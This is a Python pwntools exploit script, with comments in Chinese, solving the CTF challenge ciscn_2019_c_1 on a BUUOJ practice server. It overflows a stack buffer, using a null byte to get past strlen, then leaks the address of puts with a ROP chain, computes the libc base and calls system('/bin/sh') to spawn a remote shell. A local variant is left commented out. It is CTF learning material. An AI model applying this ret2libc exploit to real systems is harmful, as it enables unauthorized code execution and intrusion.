# ciscn_2019_c_1
# 本题有strlen影响 payload, 使用\0来处理
# gets在回车处结束而\x00可以被正常读入
from pwn import *

io = remote('node4.buuoj.cn',28050)
# io = process('./ciscn_2019_c_1')
e = ELF('./ciscn_2019_c_1')
context(log_level='debug', arch='amd64', os='linux')

ret = 0x00000000004006b9

main_addr = e.symbols['encrypt']
puts_plt = e.symbols["puts"]
puts_got = e.got["puts"]
pop_rdi_ret = 0x0000000000400c83

junk = '\0' + 'a' * (0x50 + 8 - 1)

payload = flat(junk, pop_rdi_ret, puts_got, puts_plt, main_addr)

io.sendline('1')
io.sendline(payload)
print(io.recvuntil('Ciphertext\n\n').decode())
addr = io.recv()[:6]
addr = unpack(addr.ljust(8, b'\x00')) # 地址是6bytes, 补到8位unpack
print(hex(addr))

# https://libc.blukat.me/ 查一下 puts 9c0  查后三位就行   # 本题 libc6_2.27-3ubuntu1_amd64
system_addr = 0x04f440
puts = 0x0809c0
str_bin_sh = 0x1b3e9a
base = addr - puts

system = base + system_addr
bin_sh = base + str_bin_sh
payload = flat(junk, ret, pop_rdi_ret, bin_sh, system)  # ubuntu64需要栈对齐, 加个ret
io.sendline(payload)

io.interactive()

# 本地exp
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# base = addr - libc.symbols['puts']
#
# system = base + libc.symbols["system"]
# bin_sh = base + libc.search(b'/bin/sh').__next__()
# payload = flat(junk, pop_rdi_ret, bin_sh, system)
# io.sendline(payload)
#
# io.interactive()
